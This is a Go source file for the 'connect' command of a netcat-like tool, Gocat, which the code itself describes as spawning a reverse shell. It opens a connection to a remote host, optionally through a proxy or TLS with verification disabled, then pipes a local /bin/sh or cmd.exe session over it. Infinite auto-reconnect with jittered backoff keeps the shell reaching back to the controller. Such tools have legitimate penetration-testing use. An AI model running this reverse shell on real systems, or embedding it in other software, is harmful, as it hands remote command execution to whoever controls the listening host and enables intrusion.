package cmd

import (
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"io"
	"log"
	"net"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/realibrahimsql/Gocat/internal/backoff"
	"github.com/realibrahimsql/Gocat/internal/logger"
	"github.com/realibrahimsql/Gocat/internal/network"
	"github.com/spf13/cobra"
	"golang.org/x/net/proxy"
)

var (
	shellCommand    string
	timeout         = 30 * time.Second // Default timeout
	retryCount      int
	autoReconnect   bool
	backoffStrategy string
	backoffBase     time.Duration
	backoffMax      time.Duration
	backoffJitter   bool
	keepAlive       bool
	proxyURL        string
	useSSL          bool
	verifyCert      bool
	insecureTLS     bool
	caCertFile      string
	useUDP          bool
	useSCTP         bool
	forceIPv6       bool
	forceIPv4       bool
	// Global flags for connect
	sendOnly     bool
	recvOnly     bool
	outputFile   string
	hexDumpFile  string
	appendOutput bool
	noShutdown   bool
	// Protocol mode flags
	useTelnet bool
	useCRLF   bool
	useZeroIO bool
	// Source flags
	sourceAddress string
	sourcePort    int
)

var connectCmd = &cobra.Command{
	Use:     "connect [host] <port>",
	Aliases: []string{"c"},
	Short:   "Connect to the controlling host",
	Long:    `Connect to a remote host and spawn a reverse shell.`,
	Args:    cobra.RangeArgs(1, 2),
	Run:     runConnect,
}

func init() {
	rootCmd.AddCommand(connectCmd)

	// Set default shell based on OS
	defaultShell := "/bin/sh"
	if runtime.GOOS == "windows" {
		defaultShell = "cmd.exe"
	}

	// Connect-specific flags (not covered by global flags)
	connectCmd.Flags().StringVar(&shellCommand, "shell", defaultShell, "Shell to use for command execution")
	connectCmd.Flags().StringVar(&caCertFile, "ca-cert", "", "CA certificate file for SSL verification")
	connectCmd.Flags().IntVar(&retryCount, "retry", 3, "Number of retry attempts (0 for infinite with --auto-reconnect)")
	connectCmd.Flags().BoolVar(&autoReconnect, "auto-reconnect", false, "Enable automatic reconnection on disconnect")
	connectCmd.Flags().StringVar(&backoffStrategy, "backoff", "exponential", "Backoff strategy: linear, exponential, fibonacci, constant")
	connectCmd.Flags().DurationVar(&backoffBase, "backoff-base", 1*time.Second, "Base delay for backoff")
	connectCmd.Flags().DurationVar(&backoffMax, "backoff-max", 60*time.Second, "Maximum delay for backoff")
	connectCmd.Flags().BoolVar(&backoffJitter, "backoff-jitter", true, "Add jitter to backoff delays")
	connectCmd.Flags().BoolVar(&keepAlive, "keep-alive", false, "Enable TCP keep-alive")
	connectCmd.Flags().BoolVar(&verifyCert, "verify-cert", true, "Verify SSL certificate")
	connectCmd.Flags().BoolVar(&insecureTLS, "insecure", false, "Disable TLS certificate verification (MITM risk)")
	connectCmd.Flags().StringVar(&proxyURL, "proxy", "", "Proxy URL (socks5:// or http://)")
	connectCmd.Flags().BoolVar(&useUDP, "udp", false, "Use UDP instead of TCP")
	connectCmd.Flags().DurationVar(&timeout, "connect-timeout", timeout, "Connect timeout (deprecated; use --wait)")
	// Note: Global flags are used for common options:
	// --ssl (global) instead of --connect-ssl
	// --udp (global) instead of --connect-udp
	// --wait (global) instead of --connect-timeout
	// --ipv4, --ipv6 (global) instead of --connect-ipv4/ipv6
	// --proxy (global) instead of --connect-proxy
}

// runConnect connects to the target host and port using the configured shell.
func runConnect(cmd *cobra.Command, args []string) {
	var host, port string

	if len(args) == 1 {
		host = "127.0.0.1"
		port = args[0]
	} else {
		host = args[0]
		port = args[1]
	}

	// Override local flags with global flags if set
	if globalSSL, _ := cmd.Root().PersistentFlags().GetBool("ssl"); globalSSL {
		useSSL = true
	}
	if globalUDP, _ := cmd.Root().PersistentFlags().GetBool("udp"); globalUDP {
		useUDP = true
	}
	if globalIPv4, _ := cmd.Root().PersistentFlags().GetBool("ipv4"); globalIPv4 {
		forceIPv4 = true
	}
	if globalIPv6, _ := cmd.Root().PersistentFlags().GetBool("ipv6"); globalIPv6 {
		forceIPv6 = true
	}
	if globalSCTP, _ := cmd.Root().PersistentFlags().GetBool("sctp"); globalSCTP {
		useSCTP = true
	}
	if globalWait, _ := cmd.Root().PersistentFlags().GetDuration("wait"); globalWait > 0 {
		timeout = globalWait
	}
	if globalProxy, _ := cmd.Root().PersistentFlags().GetString("proxy"); globalProxy != "" {
		proxyURL = globalProxy
	}
	if globalSSLVerify, _ := cmd.Root().PersistentFlags().GetBool("ssl-verify"); globalSSLVerify {
		verifyCert = true
	}
	if insecureTLS {
		verifyCert = false
	}
	if globalSSLTrust, _ := cmd.Root().PersistentFlags().GetString("ssl-trustfile"); globalSSLTrust != "" {
		caCertFile = globalSSLTrust
	}
	// Execution flags
	if globalExec, _ := cmd.Root().PersistentFlags().GetString("exec"); globalExec != "" {
		shellCommand = globalExec
	}
	if globalShExec, _ := cmd.Root().PersistentFlags().GetString("sh-exec"); globalShExec != "" {
		shellCommand = "/bin/sh"
		// Store the command to execute
		if err := os.Setenv("GOCAT_SH_EXEC", globalShExec); err != nil {
			logger.Warn("Failed to set GOCAT_SH_EXEC: %v", err)
		}
	}
	// Data flow control flags
	if globalSendOnly, _ := cmd.Root().PersistentFlags().GetBool("send-only"); globalSendOnly {
		sendOnly = true
	}
	if globalRecvOnly, _ := cmd.Root().PersistentFlags().GetBool("recv-only"); globalRecvOnly {
		recvOnly = true
	}
	if globalNoShutdown, _ := cmd.Root().PersistentFlags().GetBool("no-shutdown"); globalNoShutdown {
		noShutdown = true
	}
	// Output flags
	if globalOutput, _ := cmd.Root().PersistentFlags().GetString("output"); globalOutput != "" {
		outputFile = globalOutput
	}
	if globalHexDump, _ := cmd.Root().PersistentFlags().GetString("hex-dump"); globalHexDump != "" {
		hexDumpFile = globalHexDump
	}
	if globalAppend, _ := cmd.Root().PersistentFlags().GetBool("append-output"); globalAppend {
		appendOutput = true
	}
	// Protocol flags
	if globalTelnet, _ := cmd.Root().PersistentFlags().GetBool("telnet"); globalTelnet {
		useTelnet = true
	}
	if globalCRLF, _ := cmd.Root().PersistentFlags().GetBool("crlf"); globalCRLF {
		useCRLF = true
	}
	if globalZeroIO, _ := cmd.Root().PersistentFlags().GetBool("zero-io"); globalZeroIO {
		useZeroIO = true
	}
	// Source flags
	if globalSource, _ := cmd.Root().PersistentFlags().GetString("source"); globalSource != "" {
		sourceAddress = globalSource
	}
	if globalSourcePort, _ := cmd.Root().PersistentFlags().GetInt("source-port"); globalSourcePort > 0 {
		sourcePort = globalSourcePort
	}

	if err := connect(host, port, shellCommand); err != nil {
		logger.Fatal("Error: %v", err)
	}
}

func connect(host, port, shell string) error {
	address := net.JoinHostPort(host, port)

	// Determine network type
	network := "tcp"
	if useUDP {
		network = "udp"
	} else if useSCTP {
		network = "sctp"
	}
	if forceIPv6 {
		network += "6"
	} else if forceIPv4 {
		network += "4"
	}

	logger.Debug("Connecting to %s using %s protocol", address, network)
	if useSSL {
		logger.Debug("SSL/TLS enabled")
	}
	if proxyURL != "" {
		logger.Debug("Using proxy: %s", proxyURL)
	}

	var conn net.Conn
	var err error

	// Setup backoff strategy
	backoffConfig := &backoff.Config{
		Strategy:    backoff.Strategy(backoffStrategy),
		BaseDelay:   backoffBase,
		MaxDelay:    backoffMax,
		Multiplier:  2.0,
		Jitter:      backoffJitter,
		MaxAttempts: retryCount + 1,
	}

	// Enable infinite retries if auto-reconnect is set
	if autoReconnect && retryCount == 0 {
		backoffConfig.MaxAttempts = 0 // Infinite
		logger.Info("Auto-reconnect enabled with infinite retries")
	}

	backoffCalc := backoff.New(backoffConfig)

	// Retry logic with configurable backoff
	attempt := 0
	for {
		if attempt > 0 {
			delay := backoffCalc.Next(attempt - 1)
			if backoffConfig.MaxAttempts > 0 {
				logger.Info("Retrying connection (attempt %d/%d) in %v", attempt+1, backoffConfig.MaxAttempts, delay)
			} else {
				logger.Info("Retrying connection (attempt %d) in %v", attempt+1, delay)
			}
			time.Sleep(delay)
		}

		conn, err = dialWithOptions(network, address)
		if err == nil {
			if attempt > 0 {
				logger.Info("Successfully reconnected after %d attempts", attempt+1)
			}
			break
		}

		logger.Warn("Connection attempt %d failed: %v", attempt+1, err)

		// Check if we should retry
		if !backoffCalc.ShouldRetry(attempt + 1) {
			return fmt.Errorf("failed to connect to %s after %d attempts: %v", address, attempt+1, err)
		}

		attempt++
	}

	defer func() {
		if err := conn.Close(); err != nil {
			logger.Error("Error closing connection: %v", err)
		}
	}()

	// Configure keep-alive for TCP connections
	if keepAlive && !useUDP {
		if tcpConn, ok := conn.(*net.TCPConn); ok {
			if err := tcpConn.SetKeepAlive(true); err != nil {
				logger.Warn("Failed to enable keep-alive: %v", err)
			} else {
				if err := tcpConn.SetKeepAlivePeriod(30 * time.Second); err != nil {
					logger.Warn("Failed to set keep-alive period: %v", err)
				}
			}
		}
	}

	theme := logger.GetCurrentTheme()
	if _, err := theme.Success.Printf("Connected to %s\n", address); err != nil {
		log.Printf("Error printing success message: %v", err)
	}

	// Handle zero-I/O mode - just test connection and exit
	if useZeroIO {
		logger.Info("Zero-I/O mode: Connection successful, no data transfer")
		return nil
	}

	// Wrap connection with telnet handler if enabled
	var finalConn net.Conn = conn
	if useTelnet {
		logger.Debug("Telnet mode enabled: handling telnet protocol negotiations")
		finalConn = newTelnetConn(conn)
	}

	if runtime.GOOS == "windows" {
		return connectWindows(finalConn, shell)
	} else {
		return connectUnix(finalConn, shell)
	}
}

// dialWithOptions dials the given network and address using the configured options.
// It applies the configured dial timeout, binds the local endpoint to the configured
// source address and port when provided, routes the connection through a configured
// proxy if set, and performs TLS handshake when SSL is enabled.
func dialWithOptions(network, address string) (net.Conn, error) {
	// Handle SCTP separately
	if strings.Contains(network, "sctp") {
		return dialSCTP(network, address)
	}

	var dialer net.Dialer
	dialer.Timeout = timeout

	// Set source address if specified
	if sourceAddress != "" {
		var localAddr net.Addr
		var err error
		if strings.Contains(network, "tcp") {
			localAddr, err = net.ResolveTCPAddr(network, net.JoinHostPort(sourceAddress, fmt.Sprintf("%d", sourcePort)))
		} else if strings.Contains(network, "udp") {
			localAddr, err = net.ResolveUDPAddr(network, net.JoinHostPort(sourceAddress, fmt.Sprintf("%d", sourcePort)))
		}
		if err != nil {
			return nil, fmt.Errorf("failed to resolve local address: %v", err)
		}
		dialer.LocalAddr = localAddr
	}

	// Handle proxy
	if proxyURL != "" {
		return dialWithProxy(network, address, &dialer)
	}

	// Handle SSL/TLS
	if useSSL {
		return dialWithTLS(network, address, &dialer)
	}

	return dialer.Dial(network, address)
}

// dialSCTP establishes an SCTP connection to the given network and address
func dialSCTP(netType, address string) (net.Conn, error) {
	// Check if SCTP is supported
	if !network.IsSCTPSupported() {
		return nil, fmt.Errorf("SCTP protocol not supported on this platform")
	}

	// Parse remote address
	raddr, err := network.ResolveSCTPAddr(netType, address)
	if err != nil {
		return nil, fmt.Errorf("failed to resolve SCTP address: %w", err)
	}

	// Parse local address if specified
	var laddr *network.SCTPAddr
	if sourceAddress != "" {
		localAddress := net.JoinHostPort(sourceAddress, fmt.Sprintf("%d", sourcePort))
		laddr, err = network.ResolveSCTPAddr(netType, localAddress)
		if err != nil {
			return nil, fmt.Errorf("failed to resolve local SCTP address: %w", err)
		}
	}

	// Dial with timeout
	conn, err := network.DialSCTPTimeout(netType, laddr, raddr, timeout, nil)
	if err != nil {
		return nil, fmt.Errorf("SCTP dial failed: %w", err)
	}

	return conn, nil
}

func dialWithProxy(network, address string, dialer *net.Dialer) (net.Conn, error) {
	proxyParsed, err := url.Parse(proxyURL)
	if err != nil {
		return nil, fmt.Errorf("invalid proxy URL: %v", err)
	}

	switch proxyParsed.Scheme {
	case "socks5":
		proxySocks5, err := proxy.SOCKS5("tcp", proxyParsed.Host, nil, dialer)
		if err != nil {
			return nil, fmt.Errorf("failed to create SOCKS5 proxy: %v", err)
		}
		return proxySocks5.Dial(network, address)
	case "http", "https":
		// For HTTP proxy, we need to use HTTP CONNECT method
		return dialWithHTTPProxy(network, address, proxyParsed, dialer)
	default:
		return nil, fmt.Errorf("unsupported proxy scheme: %s", proxyParsed.Scheme)
	}
}

func dialWithHTTPProxy(network, address string, proxyURL *url.URL, dialer *net.Dialer) (net.Conn, error) {
	// Connect to proxy
	proxyConn, err := dialer.Dial(network, proxyURL.Host)
	if err != nil {
		return nil, fmt.Errorf("failed to connect to proxy: %v", err)
	}

	// Send CONNECT request
	connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", address, address)
	_, err = proxyConn.Write([]byte(connectReq))
	if err != nil {
		if closeErr := proxyConn.Close(); closeErr != nil {
			log.Printf("Error closing proxy connection: %v", closeErr)
		}
		return nil, fmt.Errorf("failed to send CONNECT request: %v", err)
	}

	// Read response
	buffer := make([]byte, 1024)
	n, err := proxyConn.Read(buffer)
	if err != nil {
		if closeErr := proxyConn.Close(); closeErr != nil {
			log.Printf("Error closing proxy connection: %v", closeErr)
		}
		return nil, fmt.Errorf("failed to read proxy response: %v", err)
	}

	response := string(buffer[:n])
	if !strings.Contains(response, "200") {
		if closeErr := proxyConn.Close(); closeErr != nil {
			log.Printf("Error closing proxy connection: %v", closeErr)
		}
		return nil, fmt.Errorf("proxy connection failed: %s", response)
	}

	return proxyConn, nil
}

// dialWithTLS establishes a TLS connection to the given network and address using the provided dialer.
// It configures TLS with a minimum version of TLS 1.2 and sets InsecureSkipVerify according to verifyCert,
// optionally loads a CA bundle from caCertFile, and applies persistent flags for server name, cipher suites,
// and ALPN protocols.
func dialWithTLS(network, address string, dialer *net.Dialer) (net.Conn, error) {
	tlsConfig := &tls.Config{
		InsecureSkipVerify: !verifyCert,
		MinVersion:         tls.VersionTLS12, // Secure minimum TLS version
	}

	// Load CA certificate if provided
	if caCertFile != "" {
		caCert, err := os.ReadFile(caCertFile)
		if err != nil {
			return nil, fmt.Errorf("failed to read CA certificate: %v", err)
		}
		caCertPool := x509.NewCertPool()
		if !caCertPool.AppendCertsFromPEM(caCert) {
			return nil, fmt.Errorf("failed to parse CA certificate")
		}
		tlsConfig.RootCAs = caCertPool
	}

	// Advanced SSL/TLS features from global flags
	if sslServerName, _ := rootCmd.PersistentFlags().GetString("ssl-servername"); sslServerName != "" {
		tlsConfig.ServerName = sslServerName
	}
	// Default ServerName from the dialed host so --verify-cert actually
	// verifies against the right name instead of failing/being skipped.
	if tlsConfig.ServerName == "" {
		if host, _, err := net.SplitHostPort(address); err == nil {
			if ip := net.ParseIP(host); ip == nil && host != "" {
				tlsConfig.ServerName = host
			}
		} else if net.ParseIP(address) == nil && address != "" {
			tlsConfig.ServerName = address
		}
	}

	if !verifyCert {
		logger.Warn("TLS certificate verification disabled (--insecure): connections are MITMable")
	}

	if sslCiphers, _ := rootCmd.PersistentFlags().GetString("ssl-ciphers"); sslCiphers != "" {
		// Parse cipher suites
		cipherSuites := parseCipherSuites(sslCiphers)
		if len(cipherSuites) > 0 {
			tlsConfig.CipherSuites = cipherSuites
		}
	}

	if sslALPN, _ := rootCmd.PersistentFlags().GetString("ssl-alpn"); sslALPN != "" {
		// Parse ALPN protocols
		protocols := strings.Split(sslALPN, ",")
		for i, proto := range protocols {
			protocols[i] = strings.TrimSpace(proto)
		}
		tlsConfig.NextProtos = protocols
	}

	return tls.DialWithDialer(dialer, network, address, tlsConfig)
}

// parseCipherSuites converts cipher suite names to IDs
func parseCipherSuites(ciphers string) []uint16 {
	cipherMap := map[string]uint16{
		"TLS_RSA_WITH_AES_128_CBC_SHA":            tls.TLS_RSA_WITH_AES_128_CBC_SHA,
		"TLS_RSA_WITH_AES_256_CBC_SHA":            tls.TLS_RSA_WITH_AES_256_CBC_SHA,
		"TLS_RSA_WITH_AES_128_GCM_SHA256":         tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
		"TLS_RSA_WITH_AES_256_GCM_SHA384":         tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
		"TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA":      tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
		"TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA":      tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
		"TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256":   tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		"TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384":   tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		"TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA":    tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA,
		"TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA":    tls.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA,
		"TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256": tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
		"TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384": tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
	}

	cipherNames := strings.Split(ciphers, ":")
	var result []uint16
	for _, name := range cipherNames {
		name = strings.TrimSpace(name)
		if id, exists := cipherMap[name]; exists {
			result = append(result, id)
		}
	}
	return result
}

// handleDataFlowControl implements send-only and recv-only modes
func handleDataFlowControl(conn net.Conn) error {
	var outputWriter io.Writer = os.Stdout
	var inputReader io.Reader = os.Stdin

	// Setup output file if specified
	if outputFile != "" {
		file, err := openOutputFile(outputFile, appendOutput)
		if err != nil {
			return fmt.Errorf("failed to open output file: %v", err)
		}
		defer file.Close()
		outputWriter = file
	}

	// Setup hex dump file if specified
	if hexDumpFile != "" {
		hexFile, err := openOutputFile(hexDumpFile, appendOutput)
		if err != nil {
			return fmt.Errorf("failed to open hex dump file: %v", err)
		}
		defer hexFile.Close()
		outputWriter = &hexDumper{writer: hexFile, original: outputWriter}
	}

	if sendOnly {
		logger.Debug("Send-only mode: copying stdin to connection")
		_, err := io.Copy(conn, inputReader)
		if err != nil && !noShutdown {
			return fmt.Errorf("send-only copy error: %v", err)
		}
		return nil
	}

	if recvOnly {
		logger.Debug("Recv-only mode: copying connection to stdout")
		_, err := io.Copy(outputWriter, conn)
		if err != nil {
			return fmt.Errorf("recv-only copy error: %v", err)
		}
		return nil
	}

	return nil
}

// openOutputFile opens a file for output with append mode support
func openOutputFile(filename string, append bool) (*os.File, error) {
	flags := os.O_CREATE | os.O_WRONLY
	if append {
		flags |= os.O_APPEND
	} else {
		flags |= os.O_TRUNC
	}
	return os.OpenFile(filename, flags, 0644)
}

// hexDumper implements hex dump output
type hexDumper struct {
	writer   io.Writer
	original io.Writer
	offset   int64
}

func (h *hexDumper) Write(p []byte) (n int, err error) {
	// Write to original output if exists
	if h.original != nil {
		if _, err := h.original.Write(p); err != nil {
			return 0, fmt.Errorf("failed to write to original output: %v", err)
		}
	}

	// Write hex dump
	for i := 0; i < len(p); i += 16 {
		end := i + 16
		if end > len(p) {
			end = len(p)
		}

		// Write offset
		fmt.Fprintf(h.writer, "%08x  ", h.offset+int64(i))

		// Write hex bytes
		for j := i; j < end; j++ {
			fmt.Fprintf(h.writer, "%02x ", p[j])
		}

		// Pad if necessary
		for j := end; j < i+16; j++ {
			fmt.Fprintf(h.writer, "   ")
		}

		// Write ASCII representation
		fmt.Fprintf(h.writer, " |")
		for j := i; j < end; j++ {
			if p[j] >= 32 && p[j] <= 126 {
				fmt.Fprintf(h.writer, "%c", p[j])
			} else {
				fmt.Fprintf(h.writer, ".")
			}
		}
		fmt.Fprintf(h.writer, "|\n")
	}

	h.offset += int64(len(p))
	return len(p), nil
}

// crlfWriter wraps an io.Writer to convert LF to CRLF
type crlfWriter struct {
	writer io.Writer
}

func (c *crlfWriter) Write(p []byte) (n int, err error) {
	// Convert LF to CRLF
	var converted []byte
	for _, b := range p {
		if b == '\n' {
			converted = append(converted, '\r', '\n')
		} else {
			converted = append(converted, b)
		}
	}

	_, err = c.writer.Write(converted)
	if err != nil {
		return 0, err
	}
	// Return original byte count, not converted count
	return len(p), nil
}

// Telnet protocol constants (RFC 854)
const (
	telnetIAC  = 0xFF // Interpret As Command
	telnetDONT = 0xFE // Don't do option
	telnetDO   = 0xFD // Do option
	telnetWONT = 0xFC // Won't do option
	telnetWILL = 0xFB // Will do option
	telnetSB   = 0xFA // Subnegotiation begin
	telnetSE   = 0xF0 // Subnegotiation end
)

// telnetConn wraps a net.Conn to handle telnet protocol negotiations
type telnetConn struct {
	net.Conn
	readBuffer []byte
}

// newTelnetConn creates a new telnet connection wrapper
func newTelnetConn(conn net.Conn) *telnetConn {
	return &telnetConn{
		Conn:       conn,
		readBuffer: make([]byte, 0, 1024),
	}
}

func (t *telnetConn) Read(b []byte) (n int, err error) {
	// Read from underlying connection
	tmpBuf := make([]byte, len(b))
	nr, err := t.Conn.Read(tmpBuf)
	if err != nil {
		return 0, err
	}

	// Process telnet commands and filter them out
	var output []byte
	i := 0
	for i < nr {
		if tmpBuf[i] == telnetIAC && i+1 < nr {
			// Handle IAC sequence
			if tmpBuf[i+1] == telnetIAC {
				// Escaped IAC, add single IAC to output
				output = append(output, telnetIAC)
				i += 2
			} else if i+2 < nr && (tmpBuf[i+1] == telnetDO || tmpBuf[i+1] == telnetDONT ||
				tmpBuf[i+1] == telnetWILL || tmpBuf[i+1] == telnetWONT) {
				// Three-byte command: IAC CMD OPTION
				// Respond with opposite: WILL->WONT, DO->DONT, etc.
				response := []byte{telnetIAC, 0, tmpBuf[i+2]}
				if tmpBuf[i+1] == telnetDO {
					response[1] = telnetWONT // We won't do this option
				} else if tmpBuf[i+1] == telnetDONT {
					response[1] = telnetWONT
				} else if tmpBuf[i+1] == telnetWILL {
					response[1] = telnetDONT // We don't want this option
				} else if tmpBuf[i+1] == telnetWONT {
					response[1] = telnetDONT
				}
				// Send response
				if _, writeErr := t.Conn.Write(response); writeErr != nil {
					logger.Debug("Failed to send telnet response: %v", writeErr)
				}
				i += 3
			} else if tmpBuf[i+1] == telnetSB {
				// Subnegotiation - skip until SE
				i += 2
				for i < nr && !(tmpBuf[i] == telnetIAC && i+1 < nr && tmpBuf[i+1] == telnetSE) {
					i++
				}
				if i+1 < nr {
					i += 2 // Skip IAC SE
				}
			} else {
				// Unknown two-byte command, skip it
				i += 2
			}
		} else {
			// Regular data byte
			output = append(output, tmpBuf[i])
			i++
		}
	}

	// Copy filtered output to caller's buffer
	copy(b, output)
	return len(output), nil
}

func (t *telnetConn) Write(b []byte) (n int, err error) {
	// Escape any IAC bytes in the output
	var escaped []byte
	for _, by := range b {
		if by == telnetIAC {
			escaped = append(escaped, telnetIAC, telnetIAC) // Double IAC to escape
		} else {
			escaped = append(escaped, by)
		}
	}

	_, err = t.Conn.Write(escaped)
	if err != nil {
		return 0, err
	}
	// Return original byte count
	return len(b), nil
}

func connectWindows(conn net.Conn, shell string) error {

	// Handle data flow control modes
	if sendOnly || recvOnly {
		return handleDataFlowControl(conn)
	}

	// Create shell command
	cmd := exec.Command(shell)

	// Get pipes for stdin, stdout, stderr
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return fmt.Errorf("failed to create stdin pipe: %v", err)
	}

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return fmt.Errorf("failed to create stdout pipe: %v", err)
	}

	stderr, err := cmd.StderrPipe()
	if err != nil {
		return fmt.Errorf("failed to create stderr pipe: %v", err)
	}

	// Start the shell
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start shell: %v", err)
	}

	// Copy data between connection and shell pipes with output handling
	var outputWriter io.Writer = conn
	if useCRLF {
		logger.Debug("CRLF mode enabled: converting LF to CRLF")
		outputWriter = &crlfWriter{writer: conn}
	}
	if outputFile != "" || hexDumpFile != "" {
		outputWriter = createOutputWriter(outputWriter)
	}

	go func() {
		if !recvOnly {
			if _, err := io.Copy(stdin, conn); err != nil {
				logger.Error("conn to stdin copy error: %v", err)
			}
		}
		if err := stdin.Close(); err != nil {
			logger.Error("Error closing stdin: %v", err)
		}
	}()

	go func() {
		if !sendOnly {
			if _, err := io.Copy(outputWriter, stdout); err != nil {
				logger.Error("stdout to conn copy error: %v", err)
			}
		}
	}()

	go func() {
		if !sendOnly {
			if _, err := io.Copy(outputWriter, stderr); err != nil {
				logger.Error("stderr to conn copy error: %v", err)
			}
		}
	}()

	// Wait for the shell to exit
	if err := cmd.Wait(); err != nil {
		logger.Warn("Shell exited with error: %v", err)
	} else {
		logger.Warn("Shell exited")
	}

	return nil
}

// createOutputWriter creates appropriate output writer based on flags
func createOutputWriter(defaultWriter io.Writer) io.Writer {
	var writer io.Writer = defaultWriter

	if outputFile != "" {
		file, err := openOutputFile(outputFile, appendOutput)
		if err != nil {
			logger.Error("Failed to open output file: %v", err)
			return defaultWriter
		}
		writer = file
	}

	if hexDumpFile != "" {
		hexFile, err := openOutputFile(hexDumpFile, appendOutput)
		if err != nil {
			logger.Error("Failed to open hex dump file: %v", err)
			return writer
		}
		writer = &hexDumper{writer: hexFile, original: writer}
	}

	return writer
}
